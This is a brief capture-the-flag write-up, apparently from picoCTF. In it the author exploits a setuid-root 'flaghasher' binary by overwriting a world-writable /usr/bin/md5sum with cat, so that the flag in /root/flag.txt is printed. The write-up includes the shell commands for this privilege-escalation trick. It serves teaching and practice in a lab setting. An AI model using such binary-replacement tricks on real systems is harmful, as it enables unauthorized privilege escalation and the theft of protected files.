We SSH into the server and immediately run `ls`. 
```bash
ctf-player@pico-chall$ ls -la
total 24
drwxr-xr-x 1 ctf-player ctf-player    20 Mar 28 02:19 .
drwxr-xr-x 1 root       root          24 Mar  6 03:44 ..
drwx------ 2 ctf-player ctf-player    34 Mar 28 02:19 .cache
-rw-r--r-- 1 root       root          67 Mar  6 03:45 .profile
-rwsr-xr-x 1 root       root       18312 Mar  6 03:45 flaghasher
```
There's a binary called flaghasher that gives us an MD5 Hash of our flag. I used `strings flaghasher` to see if maybe the flag is hardcoded in the binary (unfortunately wasn't), but I found an interesting line: `/bin/bash -c 'md5sum /root/flag.txt'`.

Looks like its using md5sum to calculate the hash. Running `which md5sum` reveals that the binary is at `/usr/bin/md5sum`. Running `ls -l /usr/bin/md5sum` shows the permissions -rwxrwxrwx , meaning we have access to modify this binary.
```bash
ctf-player@pico-chall$ ls -la /usr/bin/md5sum
-rwxrwxrwx 1 root root 47480 Sep  5  2019 /usr/bin/md5sum
```
I can replace this binary using `cat /usr/bin/cat > /usr/bin/md5sum` and now `md5sum` would behave like `cat`. Running flaghasher now will instead print the contents of `/root/flag.txt` instead of it's hash.